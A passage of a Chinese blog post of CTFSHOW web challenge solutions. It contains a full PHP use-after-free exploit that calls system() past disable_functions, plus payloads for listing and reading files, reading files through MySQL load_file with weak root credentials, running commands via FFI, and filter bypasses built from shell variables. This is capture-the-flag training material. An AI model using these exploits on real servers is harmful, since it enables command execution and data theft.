class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">get_binary_base</span><span class="params">($binary_leak)</span> &#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">get_system</span><span class="params">($basic_funcs)</span> &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">trigger_uaf</span><span class="params">($arg)</span> &#123;</span><br><span class="line"></span><br><span class="line">        $arg = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        $vuln = new Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        die(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; </span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>($abc) == <span class="number">79</span> || <span class="built_in">strlen</span>($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web-73"><a href="#web-73" class="headerlink" title="web-73"></a>web-73</h3><p>可以重写strlen函数，用上面的脚本即可。</p>
<p>目录遍历再包含</p>
<p>c&#x3D;%3F%3E%3C%3Fphp%20%24a%3Dnew%20DirectoryIterator(%22glob%3A%2F%2F%2F*%22)%3B%0Aforeach(%24a%20as%20%24f)%0A%7Becho(%24f-%3E__toString().’%20’)%3B%0A%7D%0Aexit(0)%3B%0A%3F%3E%0A</p>
<p>c&#x3D;include(‘&#x2F;flagc.txt’);exit();</p>
<h3 id="web-74"><a href="#web-74" class="headerlink" title="web-74*"></a>web-74*</h3><p>老规矩，先扫目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>bin dev etc flagx.txt home lib media mnt opt proc root run sbin srv sys tmp usr var</p>
<p>c&#x3D;include(‘&#x2F;flagx.txt’);exit();</p>
<p>可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flagx.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>

<p><em><strong>dbname可以是mysql，只要是mysql数据库里面存在的数据库名（dbname）就可以了</strong></em><br><em><strong>还要数据库密码是弱密码 root&#x2F;root</strong></em></p>
<h3 id="web-75"><a href="#web-75" class="headerlink" title="web-75"></a>web-75</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-</span><br><span class="line">&gt;__toString().&#x27;&#x27;);&#125;exit(0);?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;</span><br><span class="line">    $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line"></span><br><span class="line">    foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row) &#123;</span><br><span class="line">        echo ($row[0]) . &quot;|&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $dbh = null;</span><br><span class="line">&#125; catch (PDOException $e) &#123;</span><br><span class="line">    echo $e-&gt;getMessage();</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br></pre></td></tr></table></figure>

<h3 id="web-77"><a href="#web-77" class="headerlink" title="web-77*"></a>web-77*</h3><p>利用php7.4的FFI</p>
<p><em><strong>(PHP 7 &gt;&#x3D; 7.4.0, PHP 8)</strong></em><br><em><strong>FFI::cdef — Creates a new FFI object</strong></em><br><em><strong>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。</strong></em></p>
<p>通过FFI，可以实现调用system函数，从而执行命令<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a><br><a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-</span><br><span class="line">&gt;__toString().&#x27;&#x27;);&#125;exit(0);?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$a=&#x27;/readflag &gt; 1.txt&#x27;;</span><br><span class="line">$ffi-&gt;system($a);exit();</span><br></pre></td></tr></table></figure>

<p>将&#x2F;readflag的执行结果重定向到1.txt</p>
<h3 id="web-118"><a href="#web-118" class="headerlink" title="web-118*"></a>web-118*</h3><p>这里使用了linux系统变量构成命令来执行的方法</p>
<p>我们要构造nl命令来查看flag</p>
<p>看题目给的hint</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">假如</span><br><span class="line">$&#123;PATH&#125; 为abcdef</span><br><span class="line">那么</span><br><span class="line">$&#123;PATH:3&#125; def</span><br><span class="line">$&#123;PATH:~0&#125; f</span><br><span class="line">$&#123;PATH:~A&#125; f  //A是字符串转换为数字为0</span><br></pre></td></tr></table></figure>

<p>所以我们可以通过</p>
<p>${PATH:~A}构造出’n’ &#x2F;&#x2F;因为他把数字禁了</p>
<p>又因为${PWD}为当前目录</p>
<p>当前目录大概率为&#x2F;var&#x2F;www&#x2F;html</p>
<p>最后一个字符为l</p>
<p>所以可以构造出’l’</p>
<p>又因为hint中flag在flag.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$&#123;IFS&#125;????.???</span><br></pre></td></tr></table></figure>



<p>还有别的利用${PATH}构造的payload</p>
<p>SHLVL是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}&#x3D;1，然后在此shell中再打开一个shell时${SHLVL}&#x3D;2。<br>${PWD:$是0，${SHLVL}为1<br>$来替代数字，截取想要的字符串</p>
<p>#${RANDOM}是随机数，$</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yake-daigua.top">Yake_呆瓜</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yake-daigua.top/2022/10/31/CTFSHOW_WP(1-197)/">https://yake-daigua.top/2022/10/31/CTFSHOW_WP(1-197)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yake-daigua.top" target="_blank">Yake_呆瓜</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTFSHOW/">CTFSHOW</a></div><div class="post_share"><div class="social-share" data-image="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/230437.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/10/31/CTFSHOW_WP(254-378)/"><img class="prev-cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/30510.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">　CTFSHOW_WP(254-378)</div></div></a></div><div class="next-post pull-right"><a href="/2022/09/29/2022%E5%B9%B49%E6%9C%88%E6%80%BB%E7%BB%93/"><img class="next-cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/龍姫_68362502.png" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2022年9月总结</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/10/31/CTFSHOW_WP(254-378)/" title="　CTFSHOW_WP(254-378)"><img class="cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/30510.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-31</div><div class="title">　CTFSHOW_WP(254-378)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="author-info__name">Yake_呆瓜</div><div class="author-info__description">爱蜜莉雅,我好喜欢你</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yake-daigua"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到Yake_呆瓜的Blog，不定期更新技术总结文章和个人阶段性学习成果。加油啊，敲键盘的大哥哥。<img src="/img/loading.gif" data-original="https://npm.arcitcgn.cn/aciano-cdn@1.0.10/Yay.gif"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-5"><span class="toc-number">1.1.</span> <span class="toc-text">web-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-6"><span class="toc-number">1.2.</span> <span class="toc-text">web-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-7"><span class="toc-number">1.3.</span> <span class="toc-text">web-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-8"><span class="toc-number">1.4.</span> <span class="toc-text">web-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-9"><span class="toc-number">1.5.</span> <span class="toc-text">web-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-11"><span class="toc-number">1.6.</span> <span class="toc-text">web-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-12"><span class="toc-number">1.7.</span> <span class="toc-text">web-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-13"><span class="toc-number">1.8.</span> <span class="toc-text">web-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-14"><span class="toc-number">1.9.</span> <span class="toc-text">web-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-15"><span class="toc-number">1.10.</span> <span class="toc-text">web-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-16"><span class="toc-number">1.11.</span> <span class="toc-text">web-16*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-17"><span class="toc-number">1.12.</span> <span class="toc-text">web-17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-18"><span class="toc-number">1.13.</span> <span class="toc-text">web-18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-20"><span class="toc-number">1.14.</span> <span class="toc-text">web-20*</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">2.</span> <span class="toc-text">爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-21"><span class="toc-number">2.1.</span> <span class="toc-text">web-21</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-22"><span class="toc-number">2.2.</span> <span class="toc-text">web-22</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-23"><span class="toc-number">2.3.</span> <span class="toc-text">web-23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-24"><span class="toc-number">2.4.</span> <span class="toc-text">web-24*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-25"><span class="toc-number">2.5.</span> <span class="toc-text">web-25*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-27"><span class="toc-number">2.6.</span> <span class="toc-text">web-27</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-28"><span class="toc-number">2.7.</span> <span class="toc-text">web-28</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-29"><span class="toc-number">3.1.</span> <span class="toc-text">web-29*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-30"><span class="toc-number">3.2.</span> <span class="toc-text">web-30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-31"><span class="toc-number">3.3.</span> <span class="toc-text">web-31*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-32"><span class="toc-number">3.4.</span> <span class="toc-text">web-32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-33"><span class="toc-number">3.5.</span> <span class="toc-text">web-33</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-34"><span class="toc-number">3.6.</span> <span class="toc-text">web-34</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-35"><span class="toc-number">3.7.</span> <span class="toc-text">web-35</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-36"><span class="toc-number">3.8.</span> <span class="toc-text">web-36</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-37"><span class="toc-number">3.9.</span> <span class="toc-text">web-37</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-38"><span class="toc-number">3.10.</span> <span class="toc-text">web-38*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-39"><span class="toc-number">3.11.</span> <span class="toc-text">web-39</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-40"><span class="toc-number">3.12.</span> <span class="toc-text">web-40*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-41"><span class="toc-number">3.13.</span> <span class="toc-text">web-41*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-42"><span class="toc-number">3.14.</span> <span class="toc-text">web-42*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-43"><span class="toc-number">3.15.</span> <span class="toc-text">web-43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-44"><span class="toc-number">3.16.</span> <span class="toc-text">web-44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-45"><span class="toc-number">3.17.</span> <span class="toc-text">web-45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-46"><span class="toc-number">3.18.</span> <span class="toc-text">web-46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-47"><span class="toc-number">3.19.</span> <span class="toc-text">web-47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-48"><span class="toc-number">3.20.</span> <span class="toc-text">web-48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-49"><span class="toc-number">3.21.</span> <span class="toc-text">web-49</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-50"><span class="toc-number">3.22.</span> <span class="toc-text">web-50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-51"><span class="toc-number">3.23.</span> <span class="toc-text">web-51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-52"><span class="toc-number">3.24.</span> <span class="toc-text">web-52</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-53"><span class="toc-number">3.25.</span> <span class="toc-text">web-53</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-54"><span class="toc-number">3.26.</span> <span class="toc-text">web-54*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-55"><span class="toc-number">3.27.</span> <span class="toc-text">web-55*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-56"><span class="toc-number">3.28.</span> <span class="toc-text">web-56</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-57"><span class="toc-number">3.29.</span> <span class="toc-text">web-57*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-58"><span class="toc-number">3.30.</span> <span class="toc-text">web-58*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-66"><span class="toc-number">3.31.</span> <span class="toc-text">web-66</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-68"><span class="toc-number">3.32.</span> <span class="toc-text">web-68</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-70"><span class="toc-number">3.33.</span> <span class="toc-text">web-70</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-71"><span class="toc-number">3.34.</span> <span class="toc-text">web-71</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-72"><span class="toc-number">3.35.</span> <span class="toc-text">web-72*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-73"><span class="toc-number">3.36.</span> <span class="toc-text">web-73</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-74"><span class="toc-number">3.37.</span> <span class="toc-text">web-74*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-75"><span class="toc-number">3.38.</span> <span class="toc-text">web-75</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-77"><span class="toc-number">3.39.</span> <span class="toc-text">web-77*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-118"><span class="toc-number">3.40.</span> <span class="toc-text">web-118*</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/10/31/2022%E5%B9%B410%E6%9C%88%E6%80%BB%E7%BB%93/" title="2022年10月总结"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/445.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="2022年10月总结"/></a><div class="content"><a class="title" href="/2022/10/31/2022%E5%B9%B410%E6%9C%88%E6%80%BB%E7%BB%93/" title="2022年10月总结">2022年10月总结</a><time datetime="2022-10-31T15:42:30.000Z" title="发表于 2022-10-31 23:42:30">2022-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/31/CTFSHOW_WP(254-378)/" title="　CTFSHOW_WP(254-378)"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/30510.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="　CTFSHOW_WP(254-378)"/></a><div class="content"><a class="title" href="/2022/10/31/CTFSHOW_WP(254-378)/" title="　CTFSHOW_WP(254-378)">　CTFSHOW_WP(254-378)</a><time datetime="2022-10-31T15:12:24.000Z" title="发表于 2022-10-31 23:12:24">2022-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/31/CTFSHOW_WP(1-197)/" title="　CTFSHOW_WP(1-197)"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/230437.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="　CTFSHOW_WP(1-197)"/></a><div class="content"><a class="title" href="/2022/10/31/CTFSHOW_WP(1-197)/" title="　CTFSHOW_WP(1-197)">　CTFSHOW_WP(1-197)</a><time datetime="2022-10-31T15:07:24.000Z" title="发表于 2022-10-31 23:07:24">2022-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/29/2022%E5%B9%B49%E6%9C%88%E6%80%BB%E7%BB%93/" title="2022年9月总结"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/龍姫_68362502.png" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="2022年9月总结"/></a><div class="content"><a class="title" href="/2022/09/29/2022%E5%B9%B49%E6%9C%88%E6%80%BB%E7%BB%93/" title="2022年9月总结">2022年9月总结</a><time datetime="2022-09-29T09:08:30.000Z" title="发表于 2022-09-29 17:08:30">2022-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/25/PHP-FPM%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/" title="PHP-FPM攻击详解"><img src="/img/loading.gif" 